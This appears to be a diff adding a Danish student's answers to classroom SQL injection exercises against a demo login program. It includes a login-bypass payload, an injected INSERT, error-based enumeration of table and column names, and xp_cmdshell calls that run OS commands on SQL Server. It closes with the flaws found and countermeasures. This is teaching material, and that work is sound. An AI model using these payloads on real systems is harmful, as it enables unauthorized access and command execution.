@@ -1,0 +1,60 @@
+Opgave 30.2
+Prøv at se om du med SQL-injektion kan logge dig selv på (dvs få Velkommen – beskeden).
+
+' or '' = '
+
+Opgave 30.3
+Prøv at se om du kan få indsat en ny bruger i tabellen med brugere.
+
+TIP: Slut af med -- for at udkommentere resten
+
+' insert into brugere values ('a','b') --
+// Bare i brugernavn, password ligegyldig
+
+Opgave 30.4
+Du har i opgave 30.3 antageligvis bare kikket i koden for at se det rigtige tabelnavn til din INSERT.
+Den mulighed har en hacker jo normalt ikke, men prøv at se om du ikke kan få
+tabelnavne og attributnavne ud i en fejlreaktion.
+
+TIP: (Kun i brugernavn)
+' having 1=1 --
+// Får brugere.brugerid ud
+' group by brugerid --
+// Får brugere.passw ud
+
+Opgave 30.5
+I masterdatabasen på SQL-server findes en stored procedure kaldet xp_cmdshell.
+Via den kan du få afviklet en DOS-kommando på serveren. Prøv at se om du kan få kaldt den via SQL-injektion.
+(Brug kun ufarlige kommandoer, som f.eks. dir)
+I tidligere udgaver af SQL-Server (dvs op til og med SQL-Server 2000) kunne man direkte kalde
+xp_cmdshell uden videre. Nu skal man først åbne for den – det gøres med følgende lille stump T-SQL.
+
+' use master exec xp_cmdshell "dir c: >> d:/test" --
+
+// Skal bruge usb pind, pga forbud mod drev c
+// Og windows
+// Ikke testet pga. kører i docker
+
+docker attach sql_server_demo
+docker exec -it sql_server_demo ls
+
+docker exec -it sql_server_demo mkdir test
+docker exec -it sql_server_demo rm -d test
+
+' use master exec xp_cmdshell "mkdir test" --
+
+// Virker ikke
+
+Opgave 30.6
+Forklar hvilke sikkerhedsmæssige uhensigtsmæssigheder, der er i det program, jeg har lavet.
+Hvad vil modtrækkende være (du skal i første omgang bare forklare – hvis tiden tillader det,
+ændrer du programmet, så det sikkerhedsmæssigt er bedre)
+
+Læser input direkte fra bruger
+Brugeren der eksekvere sql er SA = fulde rettigheder
+Du giver fejlbeskeder videre fra databasen
+
+- Validering af felter
+- Stores Procedures
+- Ikke send exceptions
+- Ikke brug sa
